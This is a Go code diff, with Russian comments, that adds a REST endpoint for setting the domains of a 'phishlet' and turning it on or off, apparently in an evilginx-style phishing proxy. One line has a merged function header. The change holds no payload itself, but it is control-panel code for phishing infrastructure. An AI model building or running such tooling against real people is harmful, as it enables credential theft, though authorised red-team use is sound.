@@ -137,6 +137,49 @@ func Handler(d Deps) http.Handler {
 		}
 		w.WriteHeader(http.StatusNoContent)
 	}))
+	// Админка фишлета: домены (как `phishlets hostname`) и вкл/выкл.
+	// PUT /api/v1/phishlets/{id} {"domains":[...], "enabled":bool}
+	mux.HandleFunc("/api/v1/phishlets/", guard(func(w http.ResponseWriter, r *http.Request) {
+		if r.Method != http.MethodPut {
+			http.Error(w, "method", http.StatusMethodNotAllowed)
+			return
+		}
+		id := strings.Trim(strings.TrimPrefix(r.URL.Path, "/api/v1/phishlets/"), "/")
+		if id == "" || strings.Contains(id, "/") {
+			http.Error(w, "bad id", http.StatusBadRequest)
+			return
+		}
+		admin, ok := d.Store.(phishletAdmin)
+		if !ok {
+			http.Error(w, "admin disabled", http.StatusNotImplemented)
+			return
+		}
+		var in struct {
+			Domains *[]string `json:"domains"`
+			Enabled *bool     `json:"enabled"`
+		}
+		if err := json.NewDecoder(io.LimitReader(r.Body, 64<<10)).Decode(&in); err != nil {
+			http.Error(w, "bad json", http.StatusBadRequest)
+			return
+		}
+		if in.Domains != nil {
+			if err := admin.SetDomains(id, *in.Domains); err != nil {
+				http.Error(w, err.Error(), http.StatusBadRequest)
+				return
+			}
+		}
+		if in.Enabled != nil {
+			if err := admin.SetEnabled(id, *in.Enabled); err != nil {
+				http.Error(w, err.Error(), http.StatusBadRequest)
+				return
+			}
+		}
+		if err := admin.Save(id); err != nil {
+			http.Error(w, err.Error(), http.StatusInternalServerError)
+			return
+		}
+		w.WriteHeader(http.StatusNoContent)
+	}))
 	mux.HandleFunc("/api/v1/phishlets/generate", guard(func(w http.ResponseWriter, r *http.Request) {
 		if r.Method != http.MethodPost {
 			http.Error(w, "method", http.StatusMethodNotAllowed)
@@ -233,8 +276,14 @@ func clientIP(r *http.Request) string {
 	return r.RemoteAddr
 }
 
-func hostOnly(h string) string {
-	if host, _, err := net.SplitHostPort(h); err == nil {
+// phishletAdmin runtime-админка стора (реализация *phishlet.Store).
+type phishletAdmin interface {
+	SetDomains(id string, domains []string) error
+	SetEnabled(id string, enabled bool) error
+	Save(id string) error
+}
+
+func hostOnly(h string) string {	if host, _, err := net.SplitHostPort(h); err == nil {
 		return host
 	}
 	return strings.Trim(h, "[]")
